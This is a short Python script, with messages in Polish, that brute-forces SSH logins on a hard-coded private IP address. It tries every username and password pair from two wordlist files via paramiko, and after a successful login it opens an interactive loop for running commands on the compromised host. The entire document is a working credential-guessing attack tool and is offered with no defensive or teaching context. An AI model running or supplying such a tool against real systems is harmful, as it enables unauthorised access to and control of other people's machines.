import time, paramiko
targetIP = "10.0.1.66"
# targetPORT = 22
usersFile = open("users.txt","r")
passwordsFile = open("passwords.txt","r")
users = usersFile.read().split("\n")
passwords = passwordsFile.read().split("\n")
usersFile.close()
passwordsFile.close()

isFind = False
for user in users:
    for password in passwords:
        print(f"Trying: {user}:{password}")
        try:
            SSHconn = paramiko.SSHClient()
            SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy)
            SSHconn.load_system_host_keys()
            SSHconn.connect(targetIP, 22, user, password)
            print("[+]Udane logowanie !")
            isFind = True
            while True:
                command = input("Wprowadz komendę:")
                if command == "exit":
                    break
                stdin, stdout, stderr = SSHconn.exec_command(command)
                time.sleep(7)
                print(stdout.read().decode())
            break
        except paramiko.ssh_exception.AuthenticationException:
            print("[-] Nieudane logowanie")
        except:
            print("Błąd połączenia")
            time.sleep(7)
    if isFind == True:
        SSHconn.close()
        break